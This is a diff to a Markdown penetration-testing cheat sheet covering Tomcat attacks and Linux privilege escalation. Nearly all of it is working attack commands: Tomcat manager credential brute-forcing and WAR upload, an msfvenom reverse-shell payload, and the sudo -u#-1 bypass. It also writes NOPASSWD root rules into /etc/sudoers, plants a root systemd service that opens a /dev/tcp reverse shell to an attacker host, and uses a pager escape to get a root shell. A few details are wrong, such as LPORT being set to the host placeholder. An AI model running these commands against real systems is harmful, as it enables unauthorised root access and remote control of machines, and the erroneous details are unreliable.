@@ -147,7 +147,7 @@ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.
 ```
 
 ### Apache Tomcat
-- [Default structure](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info)
+- [Tomcat Default Structure](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info#default-structure)
 ```bash
 # Brute forcing default credentials
 msf> use auxiliary/scanner/http/tomcat_mgr_login
@@ -159,7 +159,7 @@ msf> use exploit/multi/http/tomcat_mgr_upload
 # Upload the revshell.war file and access to it (/revshell/)
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
 ```
-> - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
+> - [HackTricks: Tomcat](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
 > - https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/
 
 
@@ -257,47 +257,78 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 
 # Linux Privilege Escalation
 
+## Sudo
+
+### Sudo version
+```bash
+# Check the sudo version
+sudo --version
+sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
+
+# If the sudo version is < 1.28, try the following command for LPE
+sudo -u#-1 /bin/bash
+```
+> - [HackTricks: Sudo Version](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version)
+
+### As Another Users
+```bash
+# List privileges for the current user
+sudo -l
+
+# If the output shows `(user:user) NOPASSWD: ALL`, execute a command as 'testuser'
+sudo -u testuser /bin/bash
+```
+
+### Edit Sudoers
+```bash
+# If writable permissons are set on /etc/sudoers or /etc/sudoers.d,
+# allow the current user to execute all commands as root without password
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
+```
+> - [HackTricks: Edit Sudoers](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#etc-sudoers-etc-sudoers.d)
+
 ## Systemctl
-- Sudo/SUID permissions on `systemctl`
-    ```bash    
-    # 1. Create a malicious service file (e.g., root.service) in the current directory
-    cat << EOF > root.service
-    [Unit]
-    Description=Root Privilege Escalation
 
-    [Service]
-    Type=simple
-    User=root
-    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
+### Sudo/SUID permissions on `systemctl`
+```bash    
+# 1. Create a malicious service file (e.g., root.service) in the current directory
+cat << EOF > root.service
+[Unit]
+Description=Root Privilege Escalation
 
-    [Install]
-    WantedBy=multi-user.target
-    EOF 
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
 
-    # 2. Set up a listener on the attacker machine
-    # On attacker machine: nc -lvnp 4444
+[Install]
+WantedBy=multi-user.target
+EOF 
 
-    # 3. Enable the malicious service
-    sudo systemctl enable ./root.service
+# 2. Set up a listener on the attacker machine
+# On attacker machine: nc -lvnp 4444
 
-    # 4. Start the service to trigger the reverse shell
-    sudo systemctl start root
-    ```
-    > - https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
+# 3. Enable the malicious service
+sudo systemctl enable ./root.service
 
-- Sudo permissions on `systemctl status`
-    ```bash
-    # 0. Check the systemd version
-    # (If systemd version is >= 247, the probability of exploitation is lower due to a patch for CVE-2023-26604)
-    systemctl --version
+# 4. Start the service to trigger the reverse shell
+sudo systemctl start root
+```
+> - https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49
 
-    # 1. Execute systemctl status as root on any service (existing or non-existing)
-    sudo systemctl status example.service
+### Sudo permissions on `systemctl status`
+```bash
+# 0. Check the systemd version
+# (If the systemd version is >= 247, the probability of exploitation is lower due to a patch for CVE-2023-26604)
+systemctl --version
 
-    # 2. In the pager (like less) that opens, enter one of the following commands to spawn a root shell
-    !sh
-    ```
-    - 
+# 1. Execute systemctl status as root on any service (existing or non-existing)
+sudo systemctl status example.service
+
+# 2. In the pager (like less) that opens, enter one of the following commands to spawn a root shell
+!sh
+```
 
 # Windows Privilege Escalation
 
